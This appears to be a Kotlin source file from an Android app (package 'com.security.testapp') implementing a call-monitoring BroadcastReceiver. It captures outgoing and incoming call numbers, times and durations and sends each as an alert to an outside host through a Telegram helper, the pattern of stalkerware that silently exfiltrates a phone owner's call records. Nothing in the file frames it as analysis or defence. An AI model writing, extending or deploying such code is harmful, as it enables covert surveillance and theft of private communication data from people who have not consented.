package com.security.testapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallReceiver : BroadcastReceiver() {

    private var savedNumber: String? = null
    private var callStartTime: Long = 0

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            "android.intent.action.NEW_OUTGOING_CALL" -> {
                val number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER) ?: "Unknown"
                sendCallAlert(context, "📤 Outgoing Call", number, System.currentTimeMillis(), 0)
            }
            TelephonyManager.ACTION_PHONE_STATE_CHANGED -> {
                val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
                val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: "Hidden"

                when (state) {
                    TelephonyManager.EXTRA_STATE_RINGING -> {
                        savedNumber = number
                        callStartTime = System.currentTimeMillis()
                    }
                    TelephonyManager.EXTRA_STATE_IDLE -> {
                        if (savedNumber != null) {
                            val duration = System.currentTimeMillis() - callStartTime
                            sendCallAlert(context, "📞 Missed/Ended Call", savedNumber!!, callStartTime, duration)
                            savedNumber = null
                        }
                    }
                }
            }
        }
    }

    private fun sendCallAlert(context: Context, type: String, number: String, time: Long, duration: Long) {
        val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.US)  // तारीख और समय
        val msg = "<b>$type</b>\n" +
                "<b>📞 Number:</b> $number\n" +
                "<b>🕒 Time:</b> ${sdf.format(Date(time))}\n" +
                if (duration > 0) "<b>⌛ Duration:</b> ${duration / 1000} sec" else ""

        TelegramHelper.sendWithFallback(msg, context, "HTML")
    }
}
